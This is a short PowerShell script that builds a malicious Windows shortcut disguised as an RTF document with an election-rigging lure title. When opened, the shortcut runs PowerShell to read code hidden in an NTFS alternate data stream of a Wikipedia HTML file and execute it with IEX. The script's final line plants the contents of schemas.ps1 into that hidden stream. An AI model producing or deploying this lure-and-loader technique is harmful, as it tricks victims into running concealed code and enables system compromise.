$destination = "37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk"
$shell = New-Object -COM WScript.Shell
$shortcut = $shell.CreateShortcut($destination)
$shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$shortcut.Arguments = "Get-Content '.\2016_United_States_presidential_election_-_Wikipedia.html' -Stream schemas | IEX"
$shortcut.Description = "The Shocking Truth About Election Rigging in America"
$shortcut.Save()
Add-Content -Path '.\2016_United_States_presidential_election_-_Wikipedia.html' -Value $(Get-Content .\schemas.ps1) -Stream schemas